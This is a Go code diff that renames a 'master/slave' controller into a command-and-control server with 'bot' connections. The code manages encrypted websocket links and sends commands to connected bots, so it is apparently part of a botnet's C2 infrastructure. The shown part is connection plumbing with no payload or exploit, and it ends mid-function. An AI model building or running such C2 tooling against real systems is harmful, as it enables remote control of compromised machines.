@@ -1,4 +1,4 @@
-package master
+package ccserver
 
 import (
 	"crypto/rsa"
@@ -21,37 +21,37 @@ const (
 	maxMessageSize = 1024                // Maximum message size allowed from peer
 )
 
-// SlaveCtrl holds the information the master needs from a connected slave
-type SlaveCtrl struct {
+// BotCtrl holds the information the master needs from a connected slave
+type BotCtrl struct {
 	id          string
 	slavePubKey *rsa.PublicKey
 	WSConn      *websocket.Conn
 	CommandChan chan *protocol.Command
-	Master      *Master
+	CC          *CommandAndControl
 }
 
-// NewSlaveCtrl is the constructor for a slave controller abstraction
-func NewSlaveCtrl(m *Master, slavePubKey string, conn *websocket.Conn) (*SlaveCtrl, error) {
+// NewBotCtrl is the constructor for a bot controller abstraction
+func NewBotCtrl(cc *CommandAndControl, slavePubKey string, conn *websocket.Conn) (*BotCtrl, error) {
 	pubKey, err := encryption.DecodePubKeyPEM([]byte(slavePubKey))
 	if err != nil {
 		return nil, fmt.Errorf("could not decode pub key: %s", err)
 	}
-	return &SlaveCtrl{
+	return &BotCtrl{
 		id:          uuid.NewV4().String(),
 		slavePubKey: pubKey,
 		WSConn:      conn,
 		CommandChan: make(chan *protocol.Command),
-		Master:      m,
+		CC:          cc,
 	}, nil
 }
 
-func (s *SlaveCtrl) reader() {
-	s.WSConn.SetReadLimit(maxMessageSize)
-	s.WSConn.SetReadDeadline(time.Now().Add(pongWait))
-	s.WSConn.SetPongHandler(func(string) error { s.WSConn.SetReadDeadline(time.Now().Add(pongWait)); return nil })
+func (b *BotCtrl) reader() {
+	b.WSConn.SetReadLimit(maxMessageSize)
+	b.WSConn.SetReadDeadline(time.Now().Add(pongWait))
+	b.WSConn.SetPongHandler(func(string) error { b.WSConn.SetReadDeadline(time.Now().Add(pongWait)); return nil })
 	for {
 		// get the next message
-		msgType, encryptedMessage, err := s.WSConn.ReadMessage()
+		msgType, encryptedMessage, err := b.WSConn.ReadMessage()
 		if err != nil {
 			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
 				log.Printf("WS connection was closed unexpectedly: %s", err)
@@ -63,21 +63,21 @@ func (s *SlaveCtrl) reader() {
 			continue
 		}
 		// decrypt the JSON event and unmarshal onto the event type
-		jsonMsg, err := encryption.DecryptMessage(encryptedMessage, s.Master.masterPrivKey)
+		jsonMsg, err := encryption.DecryptMessage(encryptedMessage, b.CC.masterPrivKey)
 		if err != nil {
-			log.Printf("could not decrypt message from slave %s: %s", s.id, err)
+			log.Printf("could not decrypt message from bot %s: %s", b.id, err)
 			continue
 		}
 		var msg protocol.Message
 		if err = json.Unmarshal(jsonMsg, &msg); err != nil {
-			log.Printf("could not unmarshal message from slave %s: %s", s.id, err)
+			log.Printf("could not unmarshal message from bot %s: %s", b.id, err)
 			continue
 		}
-		s.Master.receiveMsgChan <- &msg
+		b.CC.receiveMsgChan <- &msg
 	}
 }
 
-func (s *SlaveCtrl) writer() {
+func (s *BotCtrl) writer() {
 	ticker := time.NewTicker(pingPeriod)
 	defer func() {
 		ticker.Stop()
